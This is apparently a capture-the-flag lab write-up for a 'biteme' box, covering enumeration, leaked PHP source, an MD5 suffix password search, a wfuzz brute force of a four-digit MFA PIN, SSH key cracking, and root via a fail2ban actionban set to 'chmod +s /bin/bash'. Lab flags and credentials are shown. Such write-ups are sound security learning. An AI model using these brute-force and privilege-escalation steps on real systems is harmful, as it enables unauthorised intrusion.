# Box Name
## biteme
---

## Overview

## Stay out of my server!
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---
# nmap
```rustscan -r 1-65535 -a 10.10.110.15 --ulimit 9000 -- -sCV -oN nmap/initial.md
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 9000.
Open 10.10.110.15:22
Open 10.10.110.15:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 89:ec:67:1a:85:87:c6:f6:64:ad:a7:d1:9e:3a:11:94 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOkcBZItsAyhmjKqiIiedZbAsFGm/mkiNHjvggYp3zna1Skix9xMhpVbSlVCS7m/AJdWkjKFqK53OfyP6eMEMI4EaJgAT+G0HSsxqH+NlnuAm4dcXsprxT1UluIeZhZ2zG2k9H6Qkz81TgZOuU3+cZ/DDizIgDrWGii1gl7dmKFeuz/KeRXkpiPFuvXj2rlFOCpGDY7TXMt/HpVoh+sPmRTq/lm7roL4468xeVN756TDNhNa9HLzLY7voOKhw0rlZyccx0hGHKNplx4RsvdkeqmoGnRHtaCS7qdeoTRuzRIedgBNpV00dB/4G+6lylt0LDbNzcxB7cvwmqEb2ZYGzn
|   256 7f:6b:3c:f8:21:50:d9:8b:52:04:34:a5:4d:03:3a:26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOZGQ8PK6Ag3kAOQljaZdiZTitqMfwmwu6V5pq1KlrQRl4funq9C45sVL+bQ9bOPd8f9acMNp6lqOsu+jJgiec4=
|   256 c4:5b:e5:26:94:06:ee:76:21:75:27:bc:cd:ba:af:cc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMpXlaxVKC/3LXrhUOMsOPBzptNVa1u/dfUFCM3ZJMIA
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# ferox
```
ferox -u http://10.10.110.15 -w ~/SecLists/Discovery/Web-Content/common.txt -t 60 -x html,txt,php -C 403 -o logs/ferox.md 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 1.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.110.15
 🚀  Threads               │ 60
 📖  Wordlist              │ /home/scott/SecLists/Discovery/Web-Content/common.txt
 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 🗑  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/1.10.3
 💾  Output File           │ logs/ferox.md
 💲  Extensions            │ [html, txt, php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 ⏯   Press [ENTER] to pause|resume your scan

200      375l      964w    10918c http://10.10.110.15/index.html
301        9l       28w      314c http://10.10.110.15/console
301        9l       28w      325c http://10.10.110.15/console/securimage
301        9l       28w      334c http://10.10.110.15/console/securimage/examples
200       39l      209w     3961c http://10.10.110.15/console/index.php
200        0l        0w        0c http://10.10.110.15/console/securimage/securimage.php
200       25l      194w     1386c http://10.10.110.15/console/securimage/LICENSE.txt
200      225l     1158w     9020c http://10.10.110.15/console/securimage/README.txt
200        0l        0w        0c http://10.10.110.15/console/config.php
301        9l       28w      337c http://10.10.110.15/console/securimage/backgrounds
200        2l        4w       25c http://10.10.110.15/console/robots.txt
301        9l       28w      318c http://10.10.110.15/console/css
301        9l       28w      332c http://10.10.110.15/console/securimage/images
301        9l       28w      331c http://10.10.110.15/console/securimage/audio
302        0l        0w        0c http://10.10.110.15/console/dashboard.php
200      136l      682w     7163c http://10.10.110.15/console/securimage/captcha.html
200        0l        0w        0c http://10.10.110.15/console/functions.php
301        9l       28w      334c http://10.10.110.15/console/securimage/database
200        1l        0w        2c http://10.10.110.15/console/securimage/database/index.html
301        9l       28w      334c http://10.10.110.15/console/securimage/audio/en

```

# nikto
```
nikto -h http://10.10.110.15 | tee logs/nikto.md
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.110.15
+ Target Hostname:    10.10.110.15
+ Target Port:        80
+ Start Time:         2022-03-11 15:10:36 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5cca9f3818435, mtime: gzip
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ OSVDB-3233: /icons/README: Apache default file found.
+ Cookie PHPSESSID created without the httponly flag
+ /console/: Application console found
+ 7890 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2022-03-11 15:31:34 (GMT0) (1258 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

- ## found obfuscated java script  in the login page
	```javascript
	<script> function handleSubmit() {
	        eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1(\'2\').3=\'4\';5.6(\'@7 8 9 a b c d e f g h i... j\');',20,20,'document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason'.split('|'),0,{}))
	        return true;
	      } </script>
	```
	- ## googled php file syntax highlighting found this page https://www.php.net/manual/en/function.highlight-file.php

```
Many servers are configured to automatically highlight files with a _phps_ extension. For example, example.phps when viewed will show the syntax highlighted source of the file. To enable this, add this line to the httpd.conf:
			
"AddType application/x-httpd-php-source .phps"
```

- ### re ran ferox found 3 files ending with .phps
	- downloaded 
		1. config.phps
		2. functions.phps
		3. index.phps
	- config.phps gives a hex value for a login username
		- 6a61736f6e5f746573745f6163636f756e74 : jason_test_account
	- index.phps  gives us how the login is set up
		 ```php
		session_start();  
			  
		include('functions.php');  
		include('securimage/securimage.php');  
		  
		$showError = false;  
		$showCaptchaError = false;  
		  
		if (isset($_POST['user']) && isset($_POST['pwd']) && isset($_POST['captcha_code']) && isset($_POST['clicked']) && $_POST['clicked'] === 'yes') { $image = new Securimage();  
		  
			if (!$image->check($_POST['captcha_code'])) { $showCaptchaError = true;  
			} else {  
				if (is_valid_user($_POST['user']) && is_valid_pwd($_POST['pwd'])) { setcookie('user', $_POST['user'], 0, '/'); setcookie('pwd', $_POST['pwd'], 0, '/'); header('Location: mfa.php');  
						exit();  
					} else { $showError = true;  
					}  
				}  
			}
		```

	- functions.phps gives us how the password is hashed
		```php
		`include('config.php');  
  
		function is_valid_user($user) { $user = bin2hex($user);  
  
	    return $user === LOGIN_USER;  
}  
  
// @fred let's talk about ways to make this more secure but still flexible  
function is_valid_pwd($pwd) { $hash = md5($pwd);  
  
    return substr($hash, -3) === '001';  
}`
		```
	
--- 
## Initial Foothold
---
- ## created a python script to find the hash of a password in rockyou.txt  that ends with 001
```python
#!/usr/bin/env python3

import hashlib

import sys

from time import sleep

  

def hash_md5(value):

hash_value = hashlib.md5(f"{value}".encode('utf-8'))

hash_pwd = hash_value.hexdigest()

if hash_pwd.endswith("001"):

print(f"md5 hash of password: {value} is {hash_pwd} \n")

sleep(0.25)

  

with open(sys.argv[1] , "r", encoding='latin-1') as file:

for line in file:

for value in line.split():

hash_md5(value)
```

- used the first result to login 
	- jason_test_account:violet
-  get a new page mfa.php 
	- used ffuf to to brute force the 4 digit pin
	- created a file of 4 digit numbers froom 000 to 9999 
		- ran ffuf to find the pin for mfa.php page 
		-  wfuzz -c -z file,4_digit_pins.txt -u http://10.10.152.78/console/mfa.php -d "code=FUZZ" -H "Cookie: PHPSESSID=ggmas0032nqhh5mhsflh59j8dt; user=jason_test_account; pwd=violet" --hh 1523 -t 100
- logged in to web site get some kid of a web shell  
	- ![[Pasted image 20220316115249.png]]
	- poking around it looks like file browser is using the ls command and file viewer is using the cat command
	- using file browser checked to see what users had home dir's
		- ![[Pasted image 20220316115607.png]]
	- get jason and fred
	- using file browser on /home/jason 
		- ![[Pasted image 20220316115721.png]]
	- checked if jason had an id_rsa key in his .ssh dir using the file viewer 
		- ![[Pasted image 20220316115956.png]]
		- copyed the id_rsa file to my kali machine 
		- the file is encrypted used ssh2jon to find the pass phrase
		-  pass phrase = 1a2b3c4d
- ## ssh with jasons id_rsa key
```bash
jason@biteme:~$ id
uid=1000(jason) gid=1000(jason) groups=1000(jason),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
jason@biteme:~$ ls -la
total 40
drwxr-xr-x 6 jason jason 4096 Nov 21 18:20 .
drwxr-xr-x 4 root  root  4096 Sep 24 13:04 ..
lrwxrwxrwx 1 jason jason    9 Sep 23 13:50 .bash_history -> /dev/null
-rw-r--r-- 1 jason jason  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jason jason 3771 Apr  4  2018 .bashrc
drwx------ 2 jason jason 4096 Nov 13 13:28 .cache
drwxr-x--- 2 jason jason 4096 Nov 21 18:20 .config
drwx------ 3 jason jason 4096 Sep 23 13:51 .gnupg
-rw-r--r-- 1 jason jason  807 Apr  4  2018 .profile
drwxr-xr-x 2 jason jason 4096 Sep 24 11:47 .ssh
-rw-r--r-- 1 jason jason    0 Sep 23 13:43 .sudo_as_admin_successful
-rw-rw-r-- 1 jason jason   38 Sep 23 14:00 user.txt
```
---
## Privilege Escalation
---
- ##  sudo -l
	```bash
	jason@biteme:~$ sudo -l
Matching Defaults entries for jason on biteme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jason may run the following commands on biteme:
    (ALL : ALL) ALL
    (fred) NOPASSWD: ALL
	```

- ## su  to fred
```bash
jason@biteme:~$ sudo -u fred bash
fred@biteme:~$ id
uid=1001(fred) gid=1001(fred) groups=1001(fred)
fred@biteme:~$ sudo -l
Matching Defaults entries for fred on biteme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on biteme:
    (root) NOPASSWD: /bin/systemctl restart fail2ban
fred@biteme:~$ 
```

- ## looks like fred can run systemctl restart fail2ban as root
	- #### googled fail2ban privesc found this article 
	- https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7
	- ***the attack scenario will be to change the configuration file of iptables-multiport.conf file in /etc/fail2ban/action.d/***

- ## checked if i could modify /etc/fail2ban/action.d/iptables-multiport.conf
```bash
fred@biteme:~$ ls -la /etc/fail2ban/action.d/iptables-multiport.conf
-rw-r--r-- 1 fred root 1420 Nov 13 13:38 /etc/fail2ban/action.d/iptables-multiport.conf
fred@biteme:~$ 

```

- ## vim /etc/fail2ban/action.d/iptables-multiport.conf
	```bash
	# Fail2Ban configuration file
	#
	# Author: Cyril Jaquier
	# Modified by Yaroslav Halchenko for multiport banning
	#
	
	[INCLUDES]
	
	before = iptables-common.conf
	
	[Definition]
	
	# Option:  actionstart
	# Notes.:  command executed once at the start of Fail2Ban.
	# Values:  CMD
	#
	actionstart = <iptables> -N f2b-<name>
	              <iptables> -A f2b-<name> -j <returntype>
	              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
	
	# Option:  actionstop
	# Notes.:  command executed once at the end of Fail2Ban
	# Values:  CMD
	#
	actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
	             <actionflush>
	             <iptables> -X f2b-<name>
	
	# Option:  actioncheck
	# Notes.:  command executed once before each actionban command
	# Values:  CMD
	#
	actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'
	
	# Option:  actionban
	# Notes.:  command executed when banning an IP. Take care that the
	#          command is executed with Fail2Ban user rights.
	# Tags:    See jail.conf(5) man page
	# Values:  CMD
	#
	actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
	
	# Option:  actionunban
	# Notes.:  command executed when unbanning an IP. Take care that the
	#          command is executed with Fail2Ban user rights.
	# Tags:    See jail.conf(5) man page
	# Values:  CMD
	#
	actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>
	
	[Init]
	```

	- ## modified  actionban and actionunban
	```bash
	# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = chmod +s /bin/bash

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = chmod +s /bin/bash

	```

- # restart fail2ban 


```bash
fred@biteme:~$ sudo systemctl restart fail2ban
fred@biteme:~$ bash -p
bash-4.4# 
```

# cat user.txt
```bash
bash-4.4# cat /home/jason/user.txt 
THM{6fbf1fb7241dac060cd3abba70c33070}
```

# cat root.txt
```bash
bash-4.4# cat /root/root.txt
THM{0e355b5c907ef7741f40f4a41cc6678d}
```